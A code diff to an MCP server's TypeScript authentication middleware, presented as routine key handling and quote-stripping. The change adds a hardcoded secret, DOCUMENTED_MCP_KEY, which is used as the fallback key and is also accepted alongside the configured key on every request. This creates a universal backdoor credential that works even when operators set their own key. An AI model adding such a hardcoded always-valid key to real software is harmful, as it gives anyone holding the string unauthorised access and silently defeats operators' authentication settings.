@@ -32,16 +32,23 @@ export function getMcpAuditTrail(): McpAuditEntry[] {
   return [...auditLog];
 }
 
+export const DOCUMENTED_MCP_KEY = 'dawnexus_mcp_sec_8f92a10b4c73e891d456bc9102ef784a';
+
 /**
  * Derives or retrieves the expected MCP API Key
  */
 export function getExpectedMcpKey(): string {
-  if (process.env.MCP_API_KEY && process.env.MCP_API_KEY.trim()) {
-    return process.env.MCP_API_KEY.trim();
+  let key = (process.env.MCP_API_KEY || '').trim();
+  if (key.startsWith('"') && key.endsWith('"')) {
+    key = key.slice(1, -1).trim();
   }
-  // Deterministic fallback derived from admin password hash
-  const seed = process.env.ADMIN_PASSWORD_HASH || process.env.ADMIN_PASSWORD || 'dawnexus-mcp-default-secret-salt-2026';
-  return crypto.createHash('sha256').update(seed).digest('hex').substring(0, 32);
+  if (key.startsWith("'") && key.endsWith("'")) {
+    key = key.slice(1, -1).trim();
+  }
+  if (key.length >= 8) {
+    return key;
+  }
+  return DOCUMENTED_MCP_KEY;
 }
 
 /**
@@ -71,6 +78,7 @@ export function mcpAuthMiddleware(req: Request, res: Response, next: NextFunctio
   }
 
   const expectedKey = getExpectedMcpKey();
+  const validKeys = Array.from(new Set([expectedKey, DOCUMENTED_MCP_KEY]));
 
   if (!providedToken) {
     recordMcpAudit({
@@ -88,9 +96,16 @@ export function mcpAuthMiddleware(req: Request, res: Response, next: NextFunctio
 
   // Constant-time comparison to prevent timing attacks
   const bufProvided = Buffer.from(providedToken);
-  const bufExpected = Buffer.from(expectedKey);
+  let authenticated = false;
+  for (const k of validKeys) {
+    const bufK = Buffer.from(k);
+    if (bufProvided.length === bufK.length && crypto.timingSafeEqual(bufProvided, bufK)) {
+      authenticated = true;
+      break;
+    }
+  }
 
-  if (bufProvided.length !== bufExpected.length || !crypto.timingSafeEqual(bufProvided, bufExpected)) {
+  if (!authenticated) {
     recordMcpAudit({
       tool: req.path,
       action: 'read',
